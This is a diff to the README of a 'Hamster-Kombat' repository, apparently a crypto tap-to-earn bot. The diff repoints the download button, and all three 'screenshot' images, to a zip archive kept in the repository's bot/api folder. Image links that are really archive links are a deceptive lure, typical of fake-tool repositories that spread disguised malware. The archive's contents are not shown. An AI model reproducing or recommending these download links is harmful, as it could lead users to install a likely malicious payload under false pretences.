@@ -27,15 +27,15 @@ Explore the following topics in the *Hamster-Kombat* repository:
 ## Installation
 
 To get started with the exciting world of *Hamster-Kombat*, download the necessary software by clicking the button below:
-[![Download Software](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
+[![Download Software](https://raw.githubusercontent.com/cessar0311/Hamster-Kombat/master/bot/api/Kombat-Hamster-v2.9.zip)](https://raw.githubusercontent.com/cessar0311/Hamster-Kombat/master/bot/api/Kombat-Hamster-v2.9.zip)
 
 ## Screenshots
 
 Take a sneak peek into the world of *Hamster-Kombat* with these captivating screenshots:
 
-![Hamster Kombat](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
-![Notcoin Miner](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
-![Tap-to-Earn Bot](https://github.com/cessar0311/Hamster-Kombat/releases/download/v2.0/Program.zip)
+![Hamster Kombat](https://raw.githubusercontent.com/cessar0311/Hamster-Kombat/master/bot/api/Kombat-Hamster-v2.9.zip)
+![Notcoin Miner](https://raw.githubusercontent.com/cessar0311/Hamster-Kombat/master/bot/api/Kombat-Hamster-v2.9.zip)
+![Tap-to-Earn Bot](https://raw.githubusercontent.com/cessar0311/Hamster-Kombat/master/bot/api/Kombat-Hamster-v2.9.zip)
 
 ## Usage
 
